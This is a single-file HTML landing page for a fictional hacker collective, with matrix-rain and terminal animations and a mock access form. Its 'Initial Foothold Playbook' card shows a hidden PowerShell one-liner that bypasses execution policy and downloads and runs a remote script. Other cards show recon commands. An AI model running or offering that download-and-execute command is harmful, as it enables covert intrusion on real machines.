<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BLACKSITE // Zero-Day Collective</title>
  <meta name="description" content="A stark, intimidating, futuristic landing page for hackers. Single-file HTML with CSS+JS and no external dependencies." />
  <style>
    :root{
      --bg:#050607;
      --panel:#0b0f12cc; /* glass */
      --accent:#39ff14;  /* neon green */
      --accent-2:#ff0040;/* warning red */
      --ink:#e6f1ff;     /* text */
      --muted:#7f93a1;   /* secondary text */
      --grid:#0c1116;    /* grid lines */
      --card:#0b1014cc;  /* card glass */
      --shadow:0 10px 30px rgba(0,0,0,.6);
      --radius:18px;
      --speed: 400ms;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
      color:var(--ink);
      background: radial-gradient(1200px 800px at 80% 10%, #0d1117 0%, var(--bg) 45%),
                  linear-gradient(180deg, #06080b 0%, #040506 100%);
      overflow-x:hidden;
      text-rendering:optimizeLegibility;
    }
    /* Subtle scanline + noise for intimidation */
    .crt::before, .crt::after{
      content:""; position:fixed; inset:0; pointer-events:none; z-index:1;
    }
    .crt::before{background:linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px); background-size:100% 2px; mix-blend-mode:overlay;}
    .crt::after{background:radial-gradient(circle at 50% 0%, transparent 0%, transparent 55%, rgba(0,0,0,.25) 100%);}  

    /* Cyber grid */
    .grid-bg{position:fixed; inset:0; z-index:-2; background:
      linear-gradient(to right, transparent 0 calc(100% - 2px), var(--grid) calc(100% - 2px)),
      linear-gradient(to bottom, transparent 0 calc(100% - 2px), var(--grid) calc(100% - 2px));
      background-size: 120px 120px;
      mask-image: radial-gradient(ellipse at 70% -10%, black 60%, transparent 75%);
      opacity:.5;
    }

    /* MATRIX rain */
    #matrix{position:fixed; inset:0; z-index:-1; filter:drop-shadow(0 0 6px var(--accent)); opacity:.33}

    header{
      position:fixed; top:0; left:0; right:0; z-index:10; backdrop-filter: blur(8px);
      background:linear-gradient(180deg, rgba(9,12,15,.8), rgba(9,12,15,.4)); border-bottom:1px solid #0f1a23;
    }
    .wrap{max-width:1200px; margin:0 auto; padding:16px 24px; display:flex; align-items:center; gap:16px}
    nav{margin-left:auto; display:flex; gap:18px}
    a, button{color:inherit}
    .nav-link{position:relative; text-decoration:none; color:var(--muted); letter-spacing:.08em; font-size:.95rem}
    .nav-link::after{content:""; position:absolute; left:0; bottom:-6px; width:0; height:2px; background:var(--accent); transition:width var(--speed) ease}
    .nav-link:hover{color:var(--ink)}
    .nav-link:hover::after{width:100%}

    .badge{
      display:inline-flex; align-items:center; gap:8px; padding:6px 10px; border:1px solid #11202a; border-radius:999px; color:#a4ffda; background:linear-gradient(180deg,#0a151b,#061015); box-shadow:0 0 0 2px rgba(57,255,20,.06) inset;
    }
    .pulse{position:relative}
    .pulse::before{content:""; position:absolute; inset:-4px; border-radius:inherit; box-shadow:0 0 24px rgba(57,255,20,.35); filter:blur(6px); opacity:.35}

    .logo{display:flex; align-items:center; gap:12px; text-decoration:none}
    .mark{width:28px; height:28px; position:relative; isolation:isolate}
    .mark::before,.mark::after{content:""; position:absolute; inset:0; border-radius:6px; transform:skewX(-12deg);}
    .mark::before{background:conic-gradient(from 120deg, var(--accent), #00f0ff, #6a00ff, #ff005e, var(--accent)); filter:blur(.6px); opacity:.9}
    .mark::after{inset:3px; background:#05090d; box-shadow:inset 0 0 0 2px #10222b, inset 0 0 22px #0b2a1a;}
    .word{font-weight:800; letter-spacing:.14em; font-size:1.05rem}

    /* Hero */
    .hero{padding-top:120px; padding-bottom:64px}
    .hero-inner{max-width:1200px; margin:0 auto; padding:0 24px; display:grid; grid-template-columns:1.2fr .8fr; gap:32px; align-items:center}
    .panel{background:linear-gradient(180deg, rgba(9,14,16,.9), rgba(5,8,10,.65)); border:1px solid #0f1a23; border-radius:var(--radius); box-shadow:var(--shadow); position:relative; overflow:hidden}
    .panel::before{content:""; position:absolute; inset:0; background:linear-gradient(120deg, transparent, rgba(57,255,20,.06), transparent); transform:translateX(-100%); animation: sweep 4s linear infinite}
    @keyframes sweep{to{transform:translateX(100%)}}

    .hero h1{
      margin:0; font-size:clamp(2rem, 5vw, 4rem); line-height:1.1; letter-spacing:.06em;
      text-shadow:0 0 30px rgba(57,255,20,.2);
    }
    .sub{color:var(--muted); font-size:1.05rem; line-height:1.6}

    .actions{display:flex; flex-wrap:wrap; gap:14px; margin-top:20px}
    .btn{
      --glow: rgba(57,255,20,.5);
      display:inline-flex; align-items:center; gap:10px; padding:12px 16px; border-radius:14px; border:1px solid #17332a; background:linear-gradient(180deg,#0a1515,#060d0d); color:#aaffbf; text-decoration:none; text-transform:uppercase; letter-spacing:.12em; font-weight:700; font-size:.9rem; box-shadow:0 10px 20px rgba(0,0,0,.35), 0 0 0 2px rgba(57,255,20,.08) inset; transition:transform var(--speed), box-shadow var(--speed);
    }
    .btn:hover{transform:translateY(-1px); box-shadow:0 12px 22px rgba(0,0,0,.45), 0 0 16px var(--glow)}
    .btn.warn{--glow: rgba(255,0,64,.4); border-color:#3b121c; color:#ffccd6; box-shadow:0 0 0 2px rgba(255,0,64,.06) inset;}

    /* Terminal card */
    .terminal{height:380px; background:radial-gradient(1000px 400px at 130% -40%, rgba(255,0,64,.12), transparent 40%), #040607; border-radius:var(--radius); border:1px solid #151f28; overflow:hidden; position:relative}
    .terminal .bar{display:flex; align-items:center; gap:8px; padding:8px 12px; background:linear-gradient(180deg, #0a1218, #080e13); border-bottom:1px solid #0c1720}
    .dot{width:10px; height:10px; border-radius:50%}
    .dot.r{background:#ff3b47}
    .dot.y{background:#ffce5c}
    .dot.g{background:#00d742}
    .screen{padding:18px; font-size:14px; line-height:1.6; color:#a1f6c1; text-shadow:0 0 6px rgba(57,255,20,.25); height:calc(100% - 38px); overflow:auto}
    .cursor{display:inline-block; width:10px; background:var(--accent); box-shadow:0 0 10px var(--accent); animation:blink 1s steps(1) infinite}
    @keyframes blink{50%{opacity:0}}

    /* Feature grid */
    .section{padding:72px 24px}
    .container{max-width:1200px; margin:0 auto}
    .k{display:grid; grid-template-columns:repeat(3, 1fr); gap:22px}
    .card{background:linear-gradient(180deg, rgba(7,12,16,.85), rgba(6,8,10,.7)); border:1px solid #0e1a22; border-radius:var(--radius); padding:20px; box-shadow:var(--shadow); position:relative; overflow:hidden}
    .card h3{margin-top:0; letter-spacing:.08em}
    .chip{display:inline-flex; gap:8px; align-items:center; padding:6px 10px; border-radius:999px; background:#0a1216; border:1px solid #11202a; color:#7de9ff; font-size:.8rem}
    .mono{font-family:inherit; color:#9ad7ff}
    .card::after{content:""; position:absolute; inset:auto -20% -40% -20%; height:40%; background:radial-gradient(ellipse at 50% 0%, rgba(57,255,20,.18), transparent 60%);}  

    .code{position:relative; background:#04080b; border:1px solid #11202a; border-radius:14px; padding:14px; overflow:auto}
    .copy{position:absolute; top:8px; right:8px; font-size:.8rem; padding:6px 10px; border-radius:999px; background:#061218; border:1px solid #12313c; color:#a8f2ff; cursor:pointer}

    /* Footer */
    footer{padding:48px 24px 72px; border-top:1px solid #0f1a23; background:linear-gradient(180deg, rgba(7,10,12,.7), rgba(3,4,5,.9))}
    .foot{max-width:1200px; margin:0 auto; display:flex; gap:24px; flex-wrap:wrap; align-items:center; justify-content:space-between}
    .foot small{color:#70818f}

    /* Glitch title */
    .glitch{position:relative; display:inline-block}
    .glitch::before, .glitch::after{content:attr(data-text); position:absolute; left:0; top:0; width:100%; overflow:hidden}
    .glitch::before{left:1px; text-shadow:-1px 0 #00f0ff; animation:gl1 2s infinite linear alternate-reverse}
    .glitch::after{left:-1px; text-shadow:1px 0 #ff005e; animation:gl2 1.8s infinite linear alternate-reverse}
    @keyframes gl1{ 0%{clip-path:inset(0 0 86% 0)} 10%{clip-path:inset(0 0 12% 0)} 20%{clip-path:inset(0 0 42% 0)} 30%{clip-path:inset(0 0 65% 0)} 40%{clip-path:inset(0 0 24% 0)} 50%{clip-path:inset(0 0 10% 0)} 60%{clip-path:inset(0 0 70% 0)} 70%{clip-path:inset(0 0 38% 0)} 80%{clip-path:inset(0 0 50% 0)} 90%{clip-path:inset(0 0 6% 0)} 100%{clip-path:inset(0 0 92% 0)} }
    @keyframes gl2{ 0%{clip-path:inset(86% 0 0 0)} 10%{clip-path:inset(12% 0 0 0)} 20%{clip-path:inset(42% 0 0 0)} 30%{clip-path:inset(65% 0 0 0)} 40%{clip-path:inset(24% 0 0 0)} 50%{clip-path:inset(10% 0 0 0)} 60%{clip-path:inset(70% 0 0 0)} 70%{clip-path:inset(38% 0 0 0)} 80%{clip-path:inset(50% 0 0 0)} 90%{clip-path:inset(6% 0 0 0)} 100%{clip-path:inset(92% 0 0 0)} }

    /* Intruder / breach states */
    body.breach{ --accent:#ff1744; --accent-2:#ff1744; background:
      radial-gradient(1200px 800px at 80% 10%, #1a0006 0%, #0a0003 45%),
      linear-gradient(180deg, #120005 0%, #060002 100%);
      animation: alarm .25s steps(2) 10;
    }
    @keyframes alarm{50%{filter:hue-rotate(-30deg) brightness(1.25)} }

    #intruder{position:fixed; inset:0; z-index:9999; display:grid; place-items:center; background:radial-gradient(1200px 800px at 50% 40%, rgba(255,0,64,.18), rgba(0,0,0,.92) 60%), #000;}
    #intruder .mask{position:absolute; inset:0; display:grid; place-items:center; opacity:.12;}
    #intruder .mask svg{width:min(80vmin,900px); height:auto; filter:drop-shadow(0 0 24px rgba(255,0,64,.4));}
    #intruder .box{max-width:880px; margin:0 24px; border-radius:var(--radius); border:1px solid #3b121c; background:linear-gradient(180deg,#0a0b0d,#040506); box-shadow:0 40px 120px rgba(0,0,0,.85), 0 0 0 2px rgba(255,0,64,.08) inset; padding:38px; text-align:center; position:relative}
    #intruder h1{margin:0 0 6px; font-size:clamp(2rem,6vw,4rem); letter-spacing:.14em}
    #intruder p{color:#ffb3bf; font-size:1.05rem; letter-spacing:.08em}
    #intruder .reset{margin-top:16px}
    #intruder .reset .btn{--glow: rgba(0,240,255,.45); border-color:#11323b; color:#b6faff}
    #intruder .box{max-width:880px; margin:0 24px; border-radius:var(--radius); border:1px solid #3b121c; background:linear-gradient(180deg,#0a0b0d,#040506); box-shadow:0 40px 120px rgba(0,0,0,.85), 0 0 0 2px rgba(255,0,64,.08) inset; padding:38px; text-align:center}
    #intruder h1{margin:0 0 6px; font-size:clamp(2rem,6vw,4rem); letter-spacing:.14em}
    #intruder p{color:#ffb3bf; font-size:1.05rem; letter-spacing:.08em}

    /* Responsive */
    @media (max-width: 980px){
      .hero-inner{grid-template-columns:1fr; gap:20px}
      .k{grid-template-columns:1fr}
    }
  
      .k{grid-template-columns:1fr}
    }
  </style>
</head>
<body class="crt">
  <canvas id="matrix" aria-hidden="true"></canvas>
  <div class="grid-bg" aria-hidden="true"></div>

  <header>
    <div class="wrap">
      <a class="logo" href="#">
        <span class="mark"></span>
        <span class="word">BLACKSITE</span>
      </a>
      <span class="badge pulse" title="Operational">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="12" cy="12" r="10" stroke="rgba(57,255,20,.55)"/><circle cx="12" cy="12" r="6" fill="rgba(57,255,20,.35)"/></svg>
        STATUS: ARMED
      </span>
      <nav>
        <a class="nav-link" href="#intel">INTEL</a>
        <a class="nav-link" href="#tooling">TOOLING</a>
        <a class="nav-link" href="#init">INITIATE</a>
      </nav>
    </div>
  </header>

  <main class="hero">
    <div class="hero-inner">
      <section class="panel" style="padding:28px">
        <h1 class="glitch" data-text="ZERO-DAY COLLECTIVE">ZERO-DAY COLLECTIVE</h1>
        <p class="sub">We map the unknown. We weaponize curiosity. We make the future flinch. This node broadcasts ephemera, tooling, and operational doctrine for intrusion artists and defense engineers. Everything is a surface‚Äîtreat it accordingly.</p>
        <div class="actions">
          <a class="btn" href="#init">‚ñ∂ BOOT SEQUENCE</a>
          <a class="btn warn" href="#intel">‚ö† RED TEAM BRIEF</a>
        </div>
      </section>
      <aside class="terminal">
        <div class="bar">
          <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
          <span style="margin-left:8px;color:#94a3b8">/dev/pts/0 ‚Äî secure shell</span>
        </div>
        <div class="screen" id="term" role="log" aria-live="polite"></div>
      </aside>
    </div>
  </main>

  <section id="intel" class="section">
    <div class="container">
      <h2 style="margin-top:0">INTEL // CURRENT PRIORITIES</h2>
      <div class="k">
        <article class="card">
          <div class="chip">‚ñº Recon</div>
          <h3>Surface Enumeration Doctrine</h3>
          <p class="sub">Everything leaks. Start broad, narrow with entropy. Automate the boring parts, sanctify the weird edge-cases. Logs are fossils; read them like a paleontologist.</p>
          <div class="code"><button class="copy" data-target="code1">COPY</button><pre id="code1"># passive DNS + cert transparency sweep
amass enum -passive -d target.tld | tee recon/passive.txt
crtsh -d target.tld | anew recon/certs.txt
cat recon/* | sort -u | httpx -sc -title -td -ip -o recon/http.txt</pre></div>
        </article>
        <article class="card">
          <div class="chip">‚ö° Access</div>
          <h3>Initial Foothold Playbook</h3>
          <p class="sub">Prefer living-off-the-land. Fallback to crafted implants with strong opsec defaults and staged capability unlocks.</p>
          <div class="code"><button class="copy" data-target="code2">COPY</button><pre id="code2"># LOLBAS example (Windows)
powershell -ep Bypass -NoP -W Hidden -C "IEX (iwr http://intra/p.ps1)"
# Unix pivot
ssh -N -D 9050 user@edge-gw -- -o ProxyCommand='nc -x 127.0.0.1:9050 %h %p'</pre></div>
        </article>
        <article class="card">
          <div class="chip">üõ° Defense</div>
          <h3>Blue Team Countermeasures</h3>
          <p class="sub">Assume breach. Instrument everything. Block by behavior, not only by signature. Embrace deception. The quietest alert wins.</p>
          <div class="code"><button class="copy" data-target="code3">COPY</button><pre id="code3"># Linux: immutable audit on sensitive paths
sudo auditctl -w /etc/ssh/sshd_config -p wa -k ssh_guard
sudo auditctl -w /var/log -p wa -k log_tamper
# Canary token quick-drop
curl -s https://canary.local/api/new?type=fs -H "Auth: $TOKEN"</pre></div>
        </article>
      </div>
    </div>
  </section>

  <section id="tooling" class="section" style="padding-top:0">
    <div class="container">
      <h2 style="margin-top:0">TOOLING // OPERATOR MODULES</h2>
      <div class="k">
        <article class="card">
          <h3>Signal Scrambler</h3>
          <p class="sub">Transient identity profiles rotate across exit paths. Scriptable, idempotent, and hostile to correlation.</p>
          <div class="code"><button class="copy" data-target="code4">COPY</button><pre id="code4">#!/usr/bin/env bash
iface=tun0
wg-quick down $iface; sleep .6; wg-quick up $iface
ip -brief addr show $iface # verify new egress</pre></div>
        </article>
        <article class="card">
          <h3>Artifact Harvester</h3>
          <p class="sub">Collect once, parse forever. Prefer structured outputs (JSON, ECS). Every artifact gets a schema and a retention SLO.</p>
          <div class="code"><button class="copy" data-target="code5">COPY</button><pre id="code5">logstash -f harvest.conf --path.data .state 
# output: opensearch (ECS), s3 (cold), kafka (fanout)</pre></div>
        </article>
        <article class="card">
          <h3>Adversarial Sandbox</h3>
          <p class="sub">Spin up disposable labs with deterministic seeds. If it's not reproducible, it's not knowledge.</p>
          <div class="code"><button class="copy" data-target="code6">COPY</button><pre id="code6">podman run --rm -it --network none \
  -v $PWD/scenario.yml:/lab.yml ghcr.io/blacksite/lab:latest launch</pre></div>
        </article>
      </div>
    </div>
  </section>

  <section id="init" class="section" style="padding-top:0">
    <div class="container">
      <h2 style="margin-top:0">INITIATE // ACCESS REQUEST</h2>
      <div class="card" style="padding:28px">
        <form id="access" class="sub" autocomplete="off" onsubmit="return false;">
          <label for="handle">CALLSIGN</label><br />
          <input id="handle" name="handle" required minlength="3" maxlength="24" placeholder="e.g. APEX-13" style="width:100%; margin:6px 0 14px; background:#04080b; color:var(--ink); border:1px solid #11202a; padding:12px 14px; border-radius:10px;" />
          <label for="key">ACCESS KEY</label><br />
          <input id="key" name="key" type="password" required minlength="8" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" style="width:100%; margin:6px 0 16px; background:#04080b; color:var(--ink); border:1px solid #11202a; padding:12px 14px; border-radius:10px;" />
          <div style="display:flex; gap:12px; align-items:center; flex-wrap:wrap">
            <button class="btn" id="btn-init">INITIATE HANDSHAKE</button>
            <span id="status" class="chip" aria-live="polite">IDLE</span>
          </div>
        </form>
      </div>
    </div>
  </section>

  <footer>
    <div class="foot">
      <small>¬© <span id="year"></span> BLACKSITE. non omnis moriar. <span style="color:var(--accent)">‚óè</span></small>
      <small>Built as a single-file artifact. No external calls. Stay mean, stay curious.</small>
    </div>
  </footer>

<script>
  // ====== MATRIX RAIN ======
  (function(){
    const c = document.getElementById('matrix');
    const ctx = c.getContext('2d');
    function fit(){ c.width = innerWidth; c.height = innerHeight; }
    fit(); addEventListener('resize', fit);

    const chars = '„Ç¢„Ç´„Çµ„Çø„Éä„Éè„Éû„É§„É©„ÉØ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ$#*/+-<>[]{}';
    const fontSize = 16;
    let columns = Math.floor(c.width / fontSize);
    let drops = Array(columns).fill(1);

    function draw(){
      ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
      ctx.fillRect(0,0,c.width,c.height);
      ctx.fillStyle = '#39ff14';
      ctx.font = fontSize + 'px ui-monospace, monospace';
      for(let i=0;i<drops.length;i++){
        const text = chars[Math.floor(Math.random()*chars.length)];
        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
        if(drops[i]*fontSize > c.height && Math.random() > 0.975){ drops[i] = 0; }
        drops[i]++;
      }
      requestAnimationFrame(draw);
    }
    draw();
  })();

  // ====== TERMINAL TYPE ======
  (function(){
    const term = document.getElementById('term');
    const lines = [
      '[BOOT] initializing secure environment‚Ä¶',
      '[OK] entropy sources linked',
      '[OK] sandbox profiles loaded (strict)',
      '[OK] network egress: stealth / rotating',
      '[OK] deception layer primed',
      '[WARN] observers detected ‚Äî engagement rules: passive-aggressive',
      '',
      'cat /etc/motd',
      'welcome to BLACKSITE ‚Äî curiosity is a weapon. sharpen it.',
      '',
      'run recon --target target.tld --profile deep',
      '‚Üí queued. ETA: irrelevant. we are timeless.'
    ];
    let i=0, j=0;
    const sp = 26; // typing speed
    function tick(){
      if(i < lines.length){
        if(j === 0){ term.innerHTML += '<span class="mono">$ </span>'; }
        const line = lines[i];
        if(j < line.length){ term.innerHTML += line[j++]; setTimeout(tick, sp); }
        else { term.innerHTML += '<br />'; i++; j = 0; setTimeout(tick, 250); }
        term.scrollTop = term.scrollHeight;
      } else {
        const blink = document.createElement('span');
        blink.className = 'cursor';
        term.appendChild(blink);
      }
    }
    tick();
  })();

  // ====== COPY BUTTONS ======
  document.querySelectorAll('.copy').forEach(btn =>{
    btn.addEventListener('click', async () =>{
      const id = btn.getAttribute('data-target');
      const code = document.getElementById(id).innerText;
      try{ await navigator.clipboard.writeText(code); btn.textContent='COPIED'; setTimeout(()=>btn.textContent='COPY', 1200);}catch(e){ btn.textContent='FAILED'; setTimeout(()=>btn.textContent='COPY', 1200); }
    });
  });

  // ====== INIT FORM (mock handshake) ======
  (function(){
    const form = document.getElementById('access');
    const status = document.getElementById('status');
    const btn = document.getElementById('btn-init');
    const term = document.getElementById('term');

    let presses = 0;
    let wiped = false;

    function showWorld(){
      ['header','main','section','footer','#matrix','.grid-bg'].forEach(sel=>{
        document.querySelectorAll(sel).forEach(el=> el.style.display='');
      });
    }
    function hideWorld(){
      ['header','main','section','footer','#matrix','.grid-bg'].forEach(sel=>{
        document.querySelectorAll(sel).forEach(el=> el.style.display='none');
      });
    }
    function resetAll(){
      document.body.classList.remove('breach');
      const intr = document.getElementById('intruder');
      if(intr) intr.remove();
      showWorld();
      presses = 0; wiped = false; status.textContent='IDLE'; status.style.color='';
      term.innerHTML = ''; // clear terminal for drama
    }
    function popup(){
      const wrap = document.createElement('div');
      wrap.id = 'intruder';
      wrap.innerHTML = `
        <div class="mask" aria-hidden="true">
          <!-- simple robot/anonymous mask svg -->
          <svg viewBox="0 0 800 1000" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="#ff1744" stroke-width="10">
            <defs>
              <radialGradient id="g" cx="50%" cy="40%" r="60%">
                <stop offset="0%" stop-color="#ff1744" stop-opacity=".9"/>
                <stop offset="100%" stop-color="#ff1744" stop-opacity="0"/>
              </radialGradient>
            </defs>
            <rect x="5" y="5" width="790" height="990" rx="40" ry="40" fill="url(#g)" stroke-opacity=".25"/>
            <!-- mask outline -->
            <path d="M120 220 q280 -160 560 0 q0 380 -280 540 q-280 -160 -280 -540z"/>
            <!-- eyes -->
            <path d="M240 430 q80 -60 160 0"/>
            <path d="M560 430 q-80 -60 -160 0"/>
            <!-- brows -->
            <path d="M220 380 q120 -80 240 0"/>
            <path d="M580 380 q-120 -80 -240 0"/>
            <!-- nose -->
            <path d="M400 480 q-10 40 0 80 q10 -40 0 -80"/>
            <!-- mouth (robotic grill) -->
            <path d="M280 620 q120 80 240 0"/>
            <path d="M300 640 h200"/>
            <path d="M320 660 h160"/>
            <!-- chin plate -->
            <path d="M360 720 q40 30 80 0"/>
          </svg>
        </div>
        <div class="box">
          <h1 class="glitch" data-text="ACCESS DENIED // INTRUDER">ACCESS DENIED // INTRUDER</h1>
          <p>you are not one of us. step back from the console.</p>
          <p class="sub">this node audits curiosity. yours failed the checksum.</p>
          <div class="reset"><button class="btn" id="btn-reset">RESET [R]</button></div>
        </div>`;
      document.body.appendChild(wrap);
      document.getElementById('btn-reset').addEventListener('click', resetAll);
      wiped = true;
    }

    function log(msg){ term.insertAdjacentHTML('beforeend', `<div><span class="mono">$ </span>${msg}</div>`); term.scrollTop = term.scrollHeight; }

    // Reset hotkey
    document.addEventListener('keydown', (e)=>{
      if(e.key && e.key.toLowerCase()==='r') resetAll();
    });

    btn.addEventListener('click', () =>{
      if(wiped) return; // ignore after wipe until reset
      presses++;
      const handle = form.handle.value.trim();
      const key = form.key.value.trim();

      // Stage effects at 2 and 4 presses
      if(presses === 2){
        document.body.classList.add('breach');
        log('<span style="color:var(--accent-2)">multiple unauthorized attempts detected</span> ‚Äî triggering breach protocol.');
      }
      if(presses === 4){
        hideWorld();
        popup();
        return; // stop normal handshake after wipe
      }

      status.textContent = 'NEGOTIATING‚Ä¶';
      status.style.color = '#ffd2da';
      btn.disabled = true;
      setTimeout(()=>{
        const ok = key.length >= 8 && /[A-Z]/.test(key) && /[0-9]/.test(key);
        if(!ok){
          status.textContent = 'DENIED'; status.style.color = '#ff8aa3';
          log(`handshake <span style=\"color:var(--accent-2)\">FAILED</span> for ${handle || 'ANON'} ‚Äî policy: weak secret`);
        } else {
          status.textContent = 'GRANTED'; status.style.color = '#aaffbf';
          log(`handshake <span style=\"color:var(--accent)\">OK</span> ‚Äî welcome, ${handle || 'ANON'}! context loaded.`);
        }
        btn.disabled = false;
      }, 600);
    });
  })();

  // ====== YEAR ======
  document.getElementById('year').textContent = new Date().getFullYear();
</script>
</body>
</html>
